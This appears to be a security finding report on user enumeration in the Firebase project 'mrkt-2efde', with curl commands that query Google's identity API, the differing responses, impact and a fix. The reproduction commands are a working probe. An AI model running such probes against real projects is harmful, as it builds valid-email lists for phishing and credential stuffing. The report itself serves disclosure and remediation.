# BUG-03 — LOW: Firebase user enumeration

| Field | Value |
|---|---|
| ID | BUG-03 |
| Severity | **Low** |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (**5.3**) |
| Asset | Firebase project `mrkt-2efde` — `identitytoolkit.googleapis.com` |
| Status | **CONFIRMED** |
| Keywords | information disclosure, user enumeration, Firebase, account discovery |

## Summary
Email-enumeration protection is disabled; responses distinguish registered
emails from unregistered ones.

## Steps to Reproduce (random / non-existent address only)
```bash
K=<FIREBASE_WEB_API_KEY>
curl -sS -H 'Content-Type: application/json' \
  -d '{"identifier":"zz-nonexistent@example.invalid","continueUri":"https://aply.com/"}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$K"

curl -sS -H 'Content-Type: application/json' \
  -d '{"requestType":"PASSWORD_RESET","email":"zz-nonexistent@example.invalid"}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=$K"
```
## Evidence
```
createAuthUri   -> {"registered": false, ...}
sendOobCode     -> {"message":"EMAIL_NOT_FOUND"}
signInWithPassword -> EMAIL_NOT_FOUND vs INVALID_PASSWORD
```
## Impact
Enables building valid-email lists for phishing / credential stuffing.

## Recommended Fix
Enable Firebase **Email Enumeration Protection** (Identity Platform → Settings).

## Handling
Only random/non-existent addresses were queried; no real account targeted.